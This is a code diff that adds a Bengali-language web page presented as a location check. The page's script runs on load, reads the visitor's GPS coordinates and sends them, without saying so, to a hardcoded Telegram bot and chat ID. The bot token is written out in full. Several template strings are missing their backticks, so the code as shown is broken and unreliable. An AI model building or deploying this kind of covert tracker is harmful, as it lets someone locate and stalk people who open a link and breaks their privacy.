@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌍 লোকেশন ট্র্যাকার</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a1a;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        #status {
+            font-size: 20px;
+            font-weight: bold;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0.5; }
+        }
+        #map {
+            width: 100%;
+            height: 300px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>📍 আপনার লোকেশন যাচাই করা হচ্ছে...</h2>
+    <p id="status">অনুগ্রহ করে অপেক্ষা করুন...</p>
+    <div id="map"></div>
+
+    <script>
+        function sendLocation(lat, lon) {
+            let botToken = "8027337914:AAGCy-oDWRAkZKp_CQR0ey6zkKpA4tmy-xQ"; // 🔹 এখানে আপনার Telegram Bot Token দিন।
+            let chatID = "6515802482"; // 🔹 এখানে আপনার Chat ID দিন।
+            
+            let message = 📍 <b>আপনার লোকেশন:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps-এ দেখুন</a>;
+            let telegramURL = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=HTML;
+
+            fetch(telegramURL)
+                .then(response => console.log("📡 লোকেশন টেলিগ্রামে পাঠানো হয়েছে!"))
+                .catch(error => console.error("❌ টেলিগ্রামে পাঠাতে সমস্যা হয়েছে!", error));
+        }
+
+        function showMap(lat, lon) {
+            document.getElementById("status").innerText = "✅ লোকেশন চিহ্নিত হয়েছে!";
+            let mapDiv = document.getElementById("map");
+            mapDiv.style.display = "block";
+            mapDiv.innerHTML = <iframe width="100%" height="300px" frameborder="0"
+                src="https://www.google.com/maps?q=${lat},${lon}&output=embed"></iframe>;
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    sendLocation(lat, lon);
+                    showMap(lat, lon);
+                }, error => {
+                    document.getElementById("status").innerText = "❌ লোকেশন পাওয়া যায়নি!";
+                    console.error("লোকেশন সমস্যা:", error);
+                });
+            } else {
+                document.getElementById("status").innerText = "❌ আপনার ব্রাউজার লোকেশন সাপোর্ট করেনা!";
+            }
+        }
+
+        getLocation();
+    </script>
+</body>
+</html>
